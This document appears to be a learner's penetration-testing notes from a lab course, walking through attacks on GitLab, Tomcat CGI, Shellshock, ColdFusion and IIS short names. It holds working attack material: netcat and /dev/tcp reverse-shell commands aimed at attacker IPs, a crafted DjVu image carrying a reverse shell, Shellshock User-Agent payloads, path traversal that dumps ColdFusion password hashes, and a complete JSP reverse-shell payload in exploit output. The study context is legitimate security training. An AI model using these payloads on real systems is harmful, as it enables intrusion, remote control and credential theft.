GitLab Community Edition version 13.10.2 and lower suffered from an authenticated remote code execution [vulnerability](https://hackerone.com/reports/1154542) due to an issue with ExifTool handling metadata in uploaded image files. This issue was fixed by GitLab rather quickly, but some companies are still likely using a vulnerable version. We can use this [exploit](https://www.exploit-db.com/exploits/49951) to achieve RCE.

As this is authenticated remote code execution, we first need a valid username and password. In some instances, this would only work if we could obtain valid credentials through OSINT or a credential guessing attack. However, if we encounter a vulnerable version of GitLab that allows for self-registration, we can quickly sign up for an account and pull off the attack.

```python
─$ python3 49951.py -u test44 -p test1234 -t http://gitlab.inlanefreight.local:8081 -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.157 8443 >/tmp/f '
[1] Authenticating
Successfully Authenticated
[2] Creating Payload 
[3] Creating Snippet and Uploading
```

and we got a shell

```python
$ rlwrap nc -lvnp 8443
listening on [any] 8443 ...
git@app04:~/gitlab-workhorse$ id
id
uid=996(git) gid=997(git) groups=997(git)
```

I changed the exploit to allow forward the traffic through proxy. As described in hackerone report, the vulnerability exists because Exiftool determine the file type by examining the file content

![Screenshot_2026-04-15_22_51_16.png](/HTB/Web_Penetration_Tester/Attacking_Common_Applications/52c15761-82f2-44cc-b633-e919017973d8.png)

The issue is in DjVu metadata. If we inserted the backslash followed by a newline, the Exiftool will parse the perl code inside the quotes

```bash
$ cat /tmp/exploit.jpg  
AT&TFORM�DJVUINFO
▒,BGjpANTa�(metadata
        (Copyright "\
" . qx{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f } . \
" b ") )                                                                                                   

$ exiftool /tmp/exploit.jpg 
ExifTool Version Number         : 12.57
File Name                       : exploit.jpg
Directory                       : /tmp
File Size                       : 185 bytes
File Modification Date/Time     : 2026:04:15 22:49:33+03:00
File Access Date/Time           : 2026:04:15 22:52:49+03:00
File Inode Change Date/Time     : 2026:04:15 22:49:33+03:00
File Permissions                : -rw-rw-r--
File Type                       : DJVU
File Type Extension             : djvu
MIME Type                       : image/vnd.djvu
Image Width                     : 0
Image Height                    : 0
DjVu Version                    : 0.24
Spatial Resolution              : 300
Gamma                           : 2.2
Orientation                     : Horizontal (normal)
Copyright                       : \." . qx{rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.14.15 8443 >/tmp/f } . \." b
Image Size                      : 0x0
Megapixels                      : 0.000000
```

# Common Gateway Interfaces

## **Attacking Tomcat CGI**

### **The Core Vulnerability**

[`CVE-2019-0232`](https://www.trendmicro.com/en_us/research/19/d/uncovering-cve-2019-0232-a-remote-code-execution-vulnerability-in-apache-tomcat.html) is a critical security issue that could result in remote code execution. The flaw exists in the **CGI Servlet**, a middleware component that lets Tomcat communicate with external scripts (like Python or Perl). Specifically, the issue is triggered when the `enableCmdLineArguments` setting is turned **on**.

- **The Mechanism:** When enabled, Tomcat parses URL query strings and passes them as command-line arguments to the underlying CGI script.
- **The Failure:** On Windows, Tomcat fails to properly sanitize these inputs. This allows an attacker to use reserved characters (like `&`) to break out of the intended argument and "inject" new OS-level commands.

### **Example of an Attack**

Suppose you have a CGI script that allows users to search for books in a bookstore's catalogue. The script has two possible actions: "search by title" and "search by author."

The CGI script can use command line arguments to switch between these actions. For 
instance, the script can be called with the following URL:

```
http://example.com/cgi-bin/booksearch.cgi?action=title&query=the+great+gatsby
```

Here, the `action` parameter is set to `title`, indicating that the script should search by book title. The `query` parameter specifies the search term "the great gatsby."

If the user wants to search by author, they can use a similar URL:

```
http://example.com/cgi-bin/booksearch.cgi?action=author&query=fitzgerald
```

Here, the `action` parameter is set to `author`, indicating that the script should search by author name. The `query` parameter specifies the search term "fitzgerald."

By using command line arguments, the CGI script can easily switch between different search actions based on user input. This makes the script more flexible and easier to use.

An attacker can append a command to the URL:

> `http://example.com/cgi-bin/hello.bat?&dir`
> 

Because of the validation error, the server doesn't just pass `&dir` as a piece of text; it interprets the `&` as a command separator and executes `dir` (listing directory contents) on the host machine.

| **Category** | **Details** |
| --- | --- |
| **Affected OS** | Windows (due to how it handles command-line parsing). |
| **Versions** | 9.0.0.M1 to 9.0.17, 8.5.0 to 8.5.39, and 7.0.0 to 7.0.93. |
| **Risk Level** | **Critical** (Remote Code Execution). |

**CGI Pros & Cons**

The text notes that while CGI is simple and allows for language flexibility, it is generally **inefficient** because it starts a new process for every request, which consumes high CPU and memory and prevents data caching.

### Enumeration

**Nmap - Open Ports**

```bash
$ nmap -p- -sC -Pn -v 10.129.205.30 --open

PORT      STATE SERVICE
22/tcp    open  ssh
| ssh-hostkey: 
|   2048 ae:19:ae:07:ef:79:b7:90:5f:1a:7b:8d:42:d5:60:99 (RSA)
|   256 38:2e:76:cd:05:94:a6:e7:17:d1:80:81:65:26:25:44 (ECDSA)
|_  256 35:09:69:12:23:0f:11:bc:54:6f:dd:f7:97:bd:61:50 (ED25519)
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
5985/tcp  open  wsman
8009/tcp  open  ajp13
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp  open  http-proxy
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.17
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49669/tcp open  unknown

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2026-04-16T09:01:15
|_  start_date: N/A
|_clock-skew: 1s

NSE: Script Post-scanning.
Initiating NSE at 12:02
Completed NSE at 12:02, 0.00s elapsed
Initiating NSE at 12:02
Completed NSE at 12:02, 0.00s elapsed
Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 322.34 seconds
           Raw packets sent: 99248 (4.367MB) | Rcvd: 94602 (3.798MB)
```

Here we can see that Nmap has identified `Apache Tomcat/9.0.17` running on port `8080`.

### Finding a CGI script

One way to uncover web server content is by utilising the `ffuf` web enumeration tool along with the `dirb common.txt` wordlist. Knowing that the default directory for CGI scripts is `/cgi`, either through prior knowledge or by researching the vulnerability, we can use the URL `http://10.129.204.227:8080/cgi/FUZZ.cmd` or `http://10.129.204.227:8080/cgi/FUZZ.bat` to perform fuzzing.

**Fuzzing Extentions - .CMD, BAT**

```bash
$ ffuf -w /usr/share/wordlists/dirb/common.txt  -u http://10.129.205.30:8080/FUZZ -s

docs
favicon.ico
manager

$ ffuf -w /usr/share/wordlists/dirb/common.txt  -u http://10.129.205.30:8080/cgi/FUZZ.cmd -s
                                                                                                   

$ ffuf -w /usr/share/wordlists/dirb/common.txt  -u http://10.129.205.30:8080/cgi/FUZZ.bat -s
welcome

```

Since the operating system is Windows, we aim to fuzz for batch scripts. Although fuzzing for scripts with a .cmd extension is unsuccessful, we successfully uncover the welcome.bat file by fuzzing for files with a .bat extension.

```bash
$ curl http://10.129.205.30:8080/cgi/welcome.bat      
Welcome to CGI, this section is not functional yet. Please return to home page.
```

### Exploitation

As discussed above, we can exploit `CVE-2019-0232` by appending our own commands through the use of the batch command separator `&`. We now have a valid CGI script path discovered during the enumeration at `http://10.129.204.227:8080/cgi/welcome.bat`

```bash
$ curl "http://10.129.205.30:8080/cgi/welcome.bat?&dir"   
Welcome to CGI, this section is not functional yet. Please return to home page.
 Volume in drive C is System
 Volume Serial Number is 67BD-3D4E

 Directory of C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi

11/10/2020  01:21 PM    <DIR>          .
11/10/2020  01:21 PM    <DIR>          ..
11/10/2020  01:21 PM               133 welcome.bat
               1 File(s)            133 bytes
               2 Dir(s)   8,017,006,592 bytes free
```

 trying to run other common windows command line apps, such as `whoami` doesn't return an output.Retrieve a list of environmental variables by calling the `set` command:

```bash
$ curl "http://10.129.205.30:8080/cgi/welcome.bat?&set" 
Welcome to CGI, this section is not functional yet. Please return to home page.
AUTH_TYPE=
COMSPEC=C:\Windows\system32\cmd.exe
CONTENT_LENGTH=
CONTENT_TYPE=
GATEWAY_INTERFACE=CGI/1.1
HTTP_ACCEPT=*/*
HTTP_HOST=10.129.205.30:8080
HTTP_USER_AGENT=curl/8.14.1
PATHEXT=.COM;.EXE;.BAT;.CMD;.VBS;.JS;.WS;.MSC
PATH_INFO=
PROMPT=$P$G
QUERY_STRING=&set
REMOTE_ADDR=10.10.14.15
REMOTE_HOST=10.10.14.15
REMOTE_IDENT=
REMOTE_USER=
REQUEST_METHOD=GET
REQUEST_URI=/cgi/welcome.bat
SCRIPT_FILENAME=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
SCRIPT_NAME=/cgi/welcome.bat
SERVER_NAME=10.129.205.30
SERVER_PORT=8080
SERVER_PROTOCOL=HTTP/1.1
SERVER_SOFTWARE=TOMCAT
SystemRoot=C:\Windows
X_TOMCAT_SCRIPT_PATH=C:\Program Files\Apache Software Foundation\Tomcat 9.0\webapps\ROOT\WEB-INF\cgi\welcome.bat
```

From the list, we can see that the `PATH` variable has been unset, so we will need to hardcode paths in requests: “url-encode  `"http://10.129.205.30:8080/cgi/welcome.bat?&c:\\Windows\\system32\\hostname.exe"`”

```bash
$ curl "http://10.129.205.30:8080/cgi/welcome.bat?&c%3A%5CWindows%5Csystem32%5Chostname.exe"
Welcome to CGI, this section is not functional yet. Please return to home page.
Feldspar
```

## **Attacking Common Gateway Interface (CGI) Applications - Shellshock**

In this [blog](https://medium.com/@anaselmendili13/cve-2014-6271-shellshock-vulnerability-explained-ca784ba60b5e#:~:text=Understanding%20CGI%20%28Common%20Gateway%20Interface), it described the CGI protocol and the ShellShock vulnerability. A graphical depiction of how CGI works can be seen below.

![Diagram showing CGI program flow: 1. Browser sends URL to server. 2. Server uses CGI to run program. 3. Program runs. 4. Program sends output to server. 5. Server returns output to browser.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/cgi.gif)

[Graphic source](https://www.tcl.tk/man/aolserver3.0/cgi.gif)

Broadly, the steps are as follows:

- A directory is created on the web server containing the CGI scripts/applications. This directory is typically called `CGI-bin`.
- The web application user sends a request to the server via a URL, i.e, [https://acme.com/cgi-bin/newchiscript.pl](https://acme.com/cgi-bin/newchiscript.pl)
- The server runs the script and passed the resultant output back to the web client

### CGI Attacks

The Shellshock vulnerability ([CVE-2014-6271](https://nvd.nist.gov/vuln/detail/CVE-2014-6271)) as described in this [blog](https://medium.com/@anaselmendili13/cve-2014-6271-shellshock-vulnerability-explained-ca784ba60b5e) is:

> In simple terms, an attacker can inject malicious commands into **environment variables**.
 When a vulnerable version of Bash processes these variables, it mistakenly executes the hidden commands with the privileges of the running service.
> 

### ShellShock via CGI

Vulnerable versions of Bash will allow an attacker to execute operating system commands that are included after a function stored inside an environment variable.Let's look at a simple example where we define an environment variable and include a malicious command afterward.

```bash
env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
```

When the above variable is assigned, Bash will interpret the `y='() { :;};'` portion as a function definition for a variable `y`. The function does nothing but returns an exit code `0`, but when it is imported, it will execute the command `echo vulnerable-shellshock` if the version of Bash is vulnerable

If the system is not vulnerable, only `"not vulnerable"` will be printed.

```bash
$ env y='() { :;}; echo vulnerable-shellshock' bash -c "echo not vulnerable"
not vulnerable
```

This behavior no longer occurs on a patched system, as Bash will not execute code after a function definition is imported. Furthermore, Bash will no longer interpret `y=() {...}` as a function definition. But rather, function definitions within environment variables must now be prefixed with `BASH_FUNC_`.

### **Hands-on Example**

**Enumeration**

```bash
$ ffuf -w /usr/share/wordlists/dirb/common.txt  -u http://10.129.205.27/FUZZ -s

.htpasswd
.hta
.htaccess
cgi-bin/
index.html
server-status

$ ffuf -w /usr/share/wordlists/dirb/small.txt  -u http://10.129.205.27/cgi-bin/FUZZ -s -e .cgi
access.cgi

$ curl "http://10.129.205.27/cgi-bin/access.cgi" -i
HTTP/1.1 200 OK
Date: Thu, 16 Apr 2026 10:37:57 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Length: 0
Content-Type: text/html

```

Before when we viewed the enviroment variable of the user Feldspar, we saw that the User-Agent of the requested client were inserted into the `HTTP_USER_AGENT=curl/8.14.1` env, if we can insert bash commands into the user-agent header we will got RCE

```bash
 () { :; };echo; /bin/cat /etc/passwd
```

**Gaining a Reverse shell:** Insert this into user-agent

```bash
 () { :; };echo ; /bin/bash -i >& /dev/tcp/10.10.14.15/4444 0>&1
```

and start the listener

```bash
$ rlwrap nc -lvnp 4444                            

www-data@htb:/usr/lib/cgi-bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Mitigation

This [blog post](https://www.digitalocean.com/community/tutorials/how-to-protect-your-server-against-the-shellshock-bash-vulnerability) contains useful tips for mitigating the Shellshock vulnerability. The quickest way to remediate the vulnerability is to update the version of Bash on the affected system.

### Closing Thoughts

Shellshock is a legacy vulnerability that is now nearly a decade old. But just because of its age, that does not mean we will not run into it occasionally. If you come across any web applications using CGI scripts during your assessments (especially IoT devices), it is definitely worth digging into using the steps shown in this section. 

# **Thick Client Applications**

## **Attacking Thick Client Applications**

### **Pentesting Tools for Thick Clients**

The toolkit for thick clients is categorized by the specific layer of the application being analyzed:

### **1. Information Gathering & Reverse Engineering**

These tools help identify the architecture, frameworks, and hidden strings within the binary.

- **CFF Explorer / Detect It Easy:** Used to identify the language, framework (.NET, Java, C++), and whether the binary is 32-bit or 64-bit.
- **Strings:** Extracts plain-text sequences (URLs, hardcoded credentials, developer comments) from binaries.
- **dnSpy / JADX:** Decompilers for .NET and Java applications, respectively, allowing you to read near-original source code.
- **Ghidra / IDA Pro:** Advanced disassemblers for low-level analysis of compiled C/C++ binaries.
- **De4Dot:** A tool used to de-obfuscate .NET binaries to make them readable in decompilers.

### **2. Dynamic Analysis & Debugging**

Used to observe the application while it is running.

- **x64dbg / OllyDbg:** Debuggers used to step through assembly code and inspect memory in real-time.
- **Process Monitor (ProcMon):** Monitors file system, registry, and process activity to see what the app does "under the hood."
- **Frida:** A dynamic instrumentation toolkit used to inject scripts and hook functions during runtime.

### **3. Network & Traffic Analysis**

Used to intercept communication between the client and the server or database.

- **Wireshark / tcpdump:** For deep packet inspection of TCP/UDP traffic.
- **Burp Suite:** Used for three-tier applications communicating via HTTP/HTTPS.
- **TCPView:** Provides a real-time list of all active TCP and UDP connections.

---

### **Critical Information to Note**

- **Architecture Matters:**
    - **2-Tier:** The client talks directly to the database. These are high-risk because the database credentials are often stored within the client-side code.
    - **3-Tier:** The client talks to an application server (API). This is more secure as the database is isolated from the user.
- **Memory Is Not Private:** Sensitive data (passwords, session tokens) often sits unencrypted in the system memory (RAM). Exporting memory dumps can bypass file-level obfuscation.
- **The "Sandbox" Fallacy:** While technologies like the Java Sandbox provide isolation, they are not foolproof and can be bypassed via specific API vulnerabilities or insecure configurations.
- **Client-Side "Security" is an Illusion:** Because the code resides on the user's machine, an attacker has total control. Any security check performed solely on the client (like input validation or hardcoded permission checks) can be bypassed by modifying the binary or memory.
- **Web Vulnerabilities vs. Binary Vulnerabilities:** Standard web flaws like XSS or CSRF typically do not exist here. Instead, focus on **DLL Hijacking**, **Buffer Overflows**, and **Insecure Local Storage**.
- **Updates are a Weak Link:** Unlike web apps that update instantly on the server, thick clients require local patches. This often leaves older, vulnerable versions of the software active on user machines for long periods.

## **Exploiting Web Vulnerabilities in Thick-Client Applications**

```python
PS C:\Apps> ls . -Recurse |Select-String "8000" | select Path, LineNumber | Format-List

Path       : C:\Apps\beans.xml
LineNumber : 13

Path       : C:\Apps\fatty-client.jar
LineNumber : 7514

```

# Miscellaneous Applications

## **ColdFusion - Discovery & Enumeration**

### Technical Overview & Capabilities

ColdFusion is a Java-based web application development platform used to build dynamic, data-driven web applications.

- **Language (CFML):** Uses ColdFusion Markup Language, a tag-based language similar to HTML (e.g., `<cfquery>` for SQL statements, `<cfloop>` for iteration). It also supports Java and JavaScript.
- **Integrations:** Natively connects with major databases (MySQL, Oracle, Microsoft SQL Server) and handles complex business logic with minimal code.
- **Core Features:** Provides built-in support for session management, form handling, PDF manipulation, graphing, email management, and automatic AJAX serialization.
- **Deployment:** Runs on Windows, Mac, and Linux, and can be deployed on cloud platforms like AWS and Azure.

### Default Network Ports

While these ports can be modified during configuration, ColdFusion environments commonly expose the following:

| **Port Number** | **Protocol** | **Description** |
| --- | --- | --- |
| **80 / 443** | HTTP / HTTPS | Standard web traffic. |
| **1935** | RPC | Client-server communication. |
| **25** | SMTP | Email delivery features. |
| **8500** | SSL / Web | Often used for server communication or internal web servers. |
| **5500** | Server Monitor | Remote administration capabilities. |

### Security & Known Vulnerabilities

ColdFusion environments are historically targeted using attacks like SQL injection, Cross-Site Scripting (XSS), directory traversal, authentication bypass, and arbitrary file uploads. Notable CVEs include:

- **CVE-2021-21087:** Arbitrary disallow of uploading JSP source code.
- **CVE-2020-24453:** Active Directory integration misconfiguration.
- **CVE-2020-24450:** Command injection vulnerability.
- **CVE-2020-24449:** Arbitrary file reading vulnerability.
- **CVE-2019-15909:** Cross-Site Scripting (XSS) vulnerability.

### Enumeration & Identification Methods

During a penetration test, ColdFusion can be identified using five primary methods:

1. **Port Scanning:** Nmap service scans identifying standard web ports or the signature port `8500`.
2. **File Extensions:** The presence of `.cfm` or `.cfc` extensions in URLs.
3. **HTTP Headers:** Response headers explicitly containing `Server: ColdFusion` or `X-Powered-By: ColdFusion`.
4. **Error Messages:** Verbose error pages referencing ColdFusion-specific tags, functions, or debugging paths.
5. **Default Files/Directories:** The existence of administrative paths such as `/CFIDE/administrator/index.cfm`, `admin.cfm`, or documentation directories like `/cfdocs/`.

The `/CFIDE/administrator` path, loads the ColdFusion 8 Administrator login page. Now we know for certain that `ColdFusion 8` is running on the server.

![ColdFusion Administrator login screen with fields for username and password.](https://cdn.services-k8s.prod.aws.htb.systems/content/modules/113/coldfusion/CF8.png)

## Attacking Coldfusion

Search exisiting exploits using the `searchsploit` command line

```bash
$ searchsploit adobe coldfusion
----------------------------------------------------------------- ---------------------------------
 Exploit Title                                                   |  Path
----------------------------------------------------------------- ---------------------------------
Adobe ColdFusion - 'probe.cfm' Cross-Site Scripting              | cfm/webapps/36067.txt
Adobe ColdFusion - Directory Traversal                           | multiple/remote/14641.py
Adobe ColdFusion - Directory Traversal (Metasploit)              | multiple/remote/16985.rb
Adobe ColdFusion 11 - LDAP Java Object Deserialization Remode Co | windows/remote/50781.txt
Adobe Coldfusion 11.0.03.292866 - BlazeDS Java Object Deserializ | windows/remote/43993.py
Adobe ColdFusion 2018 - Arbitrary File Upload                    | multiple/webapps/45979.txt
Adobe ColdFusion 6/7 - User_Agent Error Page Cross-Site Scriptin | cfm/webapps/29567.txt
Adobe ColdFusion 7 - Multiple Cross-Site Scripting Vulnerabiliti | cfm/webapps/36172.txt
Adobe ColdFusion 8 - Remote Command Execution (RCE)              | cfm/webapps/50057.py
Adobe ColdFusion 9 - Administrative Authentication Bypass        | windows/webapps/27755.txt
Adobe ColdFusion 9 - Administrative Authentication Bypass (Metas | multiple/remote/30210.rb
Adobe ColdFusion < 11 Update 10 - XML External Entity Injection  | multiple/webapps/40346.py
Adobe ColdFusion APSB13-03 - Remote Multiple Vulnerabilities (Me | multiple/remote/24946.rb
Adobe ColdFusion Server 8.0.1 - '/administrator/enter.cfm' Query | cfm/webapps/33170.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_authenticatewi | cfm/webapps/33167.txt
Adobe ColdFusion Server 8.0.1 - '/wizards/common/_logintowizard. | cfm/webapps/33169.txt
Adobe ColdFusion Server 8.0.1 - 'administrator/logviewer/searchl | cfm/webapps/33168.txt
Adobe ColdFusion versions 2018_15 (and earlier) and 2021_5 and e | multiple/webapps/51875.py
----------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

### 1. Directory (Path) Traversal

If ColdFusion tags (like `<cfdirectory>` or `<cffile>`) process user-supplied parameters without strictly checking the input path, the application can be exploited.

- **Vulnerable Implementation:**

```bash
<cfdirectory directory="#ExpandPath('uploads/')#" name="fileList">
```

- **Attack Payload Example:**

```bash
[http://example.com/index.cfm?directory=../../../etc/&file=passwd](http://example.com/index.cfm?directory=../../../etc/&file=passwd)
```

**CVE-2010-2861: Arbitrary File Reading:** In Adobe ColdFusion 9.0.1 and earlier versions, several administration endpoints fail to validate the `locale` parameter:

- **Vulnerable Endpoints:**
    - `/CFIDE/administrator/settings/mappings.cfm`
    - `/logging/settings.cfm`
    - `/datasources/index.cfm`
    - `/j2eepackaging/editarchive.cfm`
    - `/CFIDE/administrator/enter.cfm`
- **Exploitation:** An attacker replaces the locale variable with path traversal strings to read files outside the directory:

```bash
[http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../../../../ColdFusion8/lib/password.properties](http://www.example.com/CFIDE/administrator/settings/mappings.cfm?locale=../../../../../../../../ColdFusion8/lib/password.properties)
```

- **The Target Asset:** Threat actors target the **`password.properties`** file (located in `[cf_root]/lib`), which contains encrypted credentials used by the ColdFusion server for databases, mail components, and administrative sessions.

searchsploit for the exploit file associated with this vunlnerability then copy it to a working directory

```bash
$ searchsploit -p 14641
```

Start the exploit:

```bash
$ python2 14641.py 10.129.2.76 8500 "../../../../../../../../ColdFusion8/lib/password.properties"
------------------------------
trying /CFIDE/wizards/common/_logintowizard.cfm
title from server in /CFIDE/wizards/common/_logintowizard.cfm:
------------------------------
#Wed Mar 22 20:53:51 EET 2017
rdspassword=0IA/F[[E>[$_6& \\Q>[K\=XP  \n
password=2F635F6D20E3FDE0C53075A84B68FB07DCEC9B03
encrypted=true
------------------------------
------------------------------
....
----------------------------
```

### 2. Unauthenticated Remote Code Execution (RCE)

Remote Code Execution (RCE) allows an attacker to run arbitrary system commands on a host. **Unauthenticated RCE** is uniquely critical because it requires zero valid user credentials or session tokens to execute.

**Vulnerable Code Concept:** Improperly sanitizing input that directly interfaces with operating system execution functions creates immediate execution vectors.

- **Vulnerable Implementation:**

```bash
<cfset cmd = "#cgi.query_string#"><cfexecute name="cmd.exe" arguments="/c #cmd#">
```

- **Attack Payload Example:**

```bash
[http://www.example.com/index.cfm?%3B%20echo%20%22compromised%22%20%3E%20C%3A%5Ccompromise.txt](http://www.example.com/index.cfm?%3B%20echo%20%22compromised%22%20%3E%20C%3A%5Ccompromise.txt).
```

using a URL-encoded semicolon %3B to append malicious commands

**CVE-2009-2265: FCKeditor File Upload to RCE:** Affecting Adobe ColdFusion 8.0.1 and earlier, this vulnerability allows unauthorized users to upload files and obtain complete remote command execution.

- **Vulnerable Path:**

```bash
/CFIDE/scripts/ajax/FCKeditor/editor/filemanager/connectors/cfm/upload.cfm?Command=FileUpload&Type=File&CurrentFolder=
```

- **Exploitation Steps:**
    1. **Locate Exploit:** Find the exploit script via Searchsploit (`searchsploit -p 50057`).
    2. **Configure Parameters:** Edit the exploit file (`50057.py`) with your host network details (`lhost`/`lport`) and target details (`rhost`/`rport`).
    3. **Execution & Payload Delivery:** Run the script to generate and send a malicious file upload request (e.g., a custom `.jsp` shell disguised or structured via a multipart/form-data request).
    4. **Reverse Shell Access:** The script handles automated cleanup and spins up an internal listener (like `Ncat`), catching an incoming connection from the target host to grant a functional remote system shell (e.g., `Microsoft Windows [Version 6.1.7600]`).

Example:

```bash
$ python3 50057.py                    

Generating a payload...
Payload size: 1498 bytes
Saved as: 1122a5142b19436fa4a4fa96309f742c.jsp

Priting request...
Content-type: multipart/form-data; boundary=d3d247d22e64403cae803c6eaa2e9693
Content-length: 1699

--d3d247d22e64403cae803c6eaa2e9693
Content-Disposition: form-data; name="newfile"; filename="1122a5142b19436fa4a4fa96309f742c.txt"
Content-Type: text/plain

<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream dg;
    OutputStream n4;

    StreamConnector( InputStream dg, OutputStream n4 )
    {
      this.dg = dg;
      this.n4 = n4;
    }

    public void run()
    {
      BufferedReader xm  = null;
      BufferedWriter j3L = null;
      try
      {
        xm  = new BufferedReader( new InputStreamReader( this.dg ) );
        j3L = new BufferedWriter( new OutputStreamWriter( this.n4 ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = xm.read( buffer, 0, buffer.length ) ) > 0 )
        {
          j3L.write( buffer, 0, length );
          j3L.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( xm != null )
          xm.close();
        if( j3L != null )
          j3L.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
  ShellPath = new String("/bin/sh");
} else {
  ShellPath = new String("cmd.exe");
}

    Socket socket = new Socket( "10.10.15.148", 4444 );
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
    ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>

--d3d247d22e64403cae803c6eaa2e9693--

Sending request and printing response...

                <script type="text/javascript">
                        window.parent.OnUploadCompleted( 0, "/userfiles/file/1122a5142b19436fa4a4fa96309f742c.jsp/1122a5142b19436fa4a4fa96309f742c.txt", "1122a5142b19436fa4a4fa96309f742c.txt", "0" );
                </script>

Printing some information for debugging...
lhost: 10.10.15.148
lport: 4444
rhost: 10.129.2.76
rport: 8500
payload: 1122a5142b19436fa4a4fa96309f742c.jsp

Deleting the payload...

Listening for connection...

Executing the payload...
listening on [any] 4444 ...

connect to [10.10.15.148] from (UNKNOWN) [10.129.2.76] 49406

Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\ColdFusion8\runtime\bin>
C:\ColdFusion8\runtime\bin>whoami
whoami
arctic\tolis
```

## IIS Tilde Enumeration

To understand this attack, you only need to understand two things: **Windows Short Names** and **IIS Guessing Behavior**.

**1. What is an "8.3 Short Name"?**

A long time ago, older operating systems (like MS-DOS) couldn't handle long file names. They required every file name to be a maximum of 8 characters long, followed by a 3-character extension (hence "8.3 format").

To maintain backward compatibility, modern Windows servers **still automatically generate a hidden short name** for every long file or folder you create.

- If you create a file named SecretDocumentsFolder.aspx, Windows creates a background alias that looks like this: SECRET~1.ASP
- The formula Windows uses takes the first **6 characters**, adds a tilde (~), adds a **number** (to distinguish files that start with the same letters), and takes the first **3 characters** of the extension.

**2. The Vulnerability: IIS Complains Differently**

The actual vulnerability lives in Microsoft IIS (the web server software). When you request a file that doesn't exist, IIS sends back an error message (like a standard 404 Not Found).

However, if you send a request using a partial short name with a tilde, **IIS handles the error differently depending on whether your guess is correct or incorrect.**

- If you guess `http://example.com/a~1/`, IIS says: *"Hey, no files start with 'a', so I'll give you a standard 404 error."*
- If you guess `http://example.com/s~1/,` IIS checks its folder, sees that SecretDocumentsFolder starts with "S", and gives a **different response** (like a 200 OK or a distinct error code).

Because the server reacts differently, **an attacker can play a game of "Twenty Questions" with the server** to guess the names of hidden files letter-by-letter.

### How the Attack Works

Imagine a hidden file exists on the server called transfer_data_backup_2026.aspx. Windows automatically cuts this name down to TRANSF~1.ASP.

`Target File: transfer_data_backup_2026.aspx  --->  Short Name: TRANSF~1.ASP`

1. **The Attacker Automates the Guessing:** Using a tool like IIS-ShortName-Scanner, the attacker asks the server: *"Do you have any short names starting with A? B? C?"*
2. **Finding the First Letter:** When the tool asks about T, the server responds positively. Now the attacker knows a hidden file starts with T.
3. **Building the Name:** The tool automatically tries TA, TB, TC... until it hits TR and gets another positive response. It repeats this until it spells out the full 6-character short name prefix: **TRANSF**.
4. **The Discovery:** The scanner successfully finishes and tells the attacker: *"Hey, I found a hidden file on this server, and its short name is TRANSF~1.ASP!"*

I used this [tool](https://github.com/bitquark/shortscan/tree/main) for shortscan 

```bash
$ ~/go/bin/shortscan http://10.129.4.215/         
🌀 Shortscan v0.9.2 · an IIS short filename enumeration tool by bitquark

════════════════════════════════════════════════════════════════════════════════
URL: http://10.129.4.215/
Running: Microsoft-IIS/7.5 (ASP.NET v2.0.50727)
Vulnerable: Yes!
════════════════════════════════════════════════════════════════════════════════
ASPNET~1             ASPNET?             ASPNET_CLIENT
CSASPX~1.CS          CSASPX?.CS 
TRANSF~1.ASP         TRANSF?.ASP?        TRANSFER.ASPX
UPLOAD~1             UPLOAD?             UPLOADEDFILES
════════════════════════════════════════════════════════════════════════════════

════════════════════════════════════════════════════════════════════════════════
URL: http://10.129.4.215/ASPNET_CLIENT/
Running: Microsoft-IIS/7.5 (ASP.NET v2.0.50727)
Vulnerable: Yes!
════════════════════════════════════════════════════════════════════════════════
SYSTEM~1             SYSTEM?             SYSTEM_WEB
════════════════════════════════════════════════════════════════════════════════

════════════════════════════════════════════════════════════════════════════════
URL: http://10.129.4.215/ASPNET_CLIENT/SYSTEM_WEB/
Running: Microsoft-IIS/7.5 (ASP.NET v2.0.50727)
Vulnerable: Yes!
════════════════════════════════════════════════════════════════════════════════
2_0_50~1             2_0_50?    
════════════════════════════════════════════════════════════════════════════════

════════════════════════════════════════════════════════════════════════════════
URL: http://10.129.4.215/UPLOADEDFILES/
Running: Microsoft-IIS/7.5 (ASP.NET v2.0.50727)
Vulnerable: No (or no 8.3 files exist)
════════════════════════════════════════════════════════════════════════════════

Finished! Requests: 1166; Retries: 0; Sent 233599 bytes; Received 724386 bytes
                                               
```

### The Final Obstacle: Finding the "Real" Name

Knowing TRANSF~1.ASP exists is great, but modern browsers or applications might block you from opening it directly using the short name. You need the *actual, original* long name.

